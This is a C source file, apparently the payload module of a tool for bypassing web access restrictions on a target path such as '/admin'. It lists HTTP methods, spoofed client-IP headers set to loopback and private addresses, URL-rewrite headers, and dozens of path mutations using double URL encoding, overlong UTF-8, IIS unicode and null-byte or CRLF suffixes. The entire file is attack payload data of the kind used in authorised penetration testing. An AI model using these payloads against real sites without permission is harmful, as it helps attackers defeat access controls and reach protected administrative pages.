#include "payloads.h"

const char *const PL_METHODS[] = {
    "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS",
    "TRACE", "CONNECT", "PROPFIND", "MKCOL", "COPY", "MOVE",
    "LOCK", "UNLOCK", "DEBUG", "TRACK", "FOO",
};
const size_t PL_METHODS_N = sizeof(PL_METHODS) / sizeof(PL_METHODS[0]);

const char *const PL_FAKE_IP_HEADERS[] = {
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Forwarded",
    "Forwarded-For",
    "Forwarded",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Real-IP",
    "X-Host",
    "X-Custom-IP-Authorization",
    "X-Original-Forwarded-For",
    "True-Client-IP",
    "Client-IP",
    "X-ProxyUser-Ip",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
};
const size_t PL_FAKE_IP_HEADERS_N =
    sizeof(PL_FAKE_IP_HEADERS) / sizeof(PL_FAKE_IP_HEADERS[0]);

const char *const PL_FAKE_IP_VALUES[] = {
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "127.0.0.1:80",
    "127.0.0.1:443",
    "192.168.0.1",
    "10.0.0.1",
    "::1",
};
const size_t PL_FAKE_IP_VALUES_N =
    sizeof(PL_FAKE_IP_VALUES) / sizeof(PL_FAKE_IP_VALUES[0]);

const char *const PL_URL_REWRITE_HEADERS[] = {
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
    "X-HTTP-DestinationURL",
    "X-Forwarded-Path",
    "Referer",
};
const size_t PL_URL_REWRITE_HEADERS_N =
    sizeof(PL_URL_REWRITE_HEADERS) / sizeof(PL_URL_REWRITE_HEADERS[0]);

/* "%s" = path alvo (ja com a barra inicial, ex: "/admin"). */
const char *const PL_PATH_MUTATIONS[] = {
    "%s/",
    "%s//",
    "//%s",
    "//%s//",
    "/./%s/./",
    "%s/.",
    "%s/..;/",
    "%s..;/",
    "%s;/",
    "%s/~",
    "%s%%20",
    "%s%%09",
    "%s%%2e",
    "/%%2e/%s",
    "%s?",
    "%s??",
    "%s#",
    "%s/*",
    "%s%%2f",
    "/%%2f%s",
    "%s.html",
    "%s.json",
    "%s.php",
    "./%s/../%s",
    /* double URL encoding */
    "%s%%252f",
    "/%%252e/%s",
    "%s%%252e",
    /* overlong UTF-8 */
    "%s%%c0%%af",
    "/%%c0%%ae%s",
    "%s%%e0%%80%%af",
    /* IIS unicode / fullwidth */
    "%s%%u002f",
    "%s%%ef%%bc%%8f",
    "%s%%uff0f",
};
const size_t PL_PATH_MUTATIONS_N =
    sizeof(PL_PATH_MUTATIONS) / sizeof(PL_PATH_MUTATIONS[0]);

const char *const PL_PATH_SUFFIXES[] = {
    "%00",
    "%0d",
    "%0a",
    "%0d%0a",
    ".json",
    ".css",
    ".html",
    "~",
    "?",
    "#",
    "/.",
};
const size_t PL_PATH_SUFFIXES_N =
    sizeof(PL_PATH_SUFFIXES) / sizeof(PL_PATH_SUFFIXES[0]);
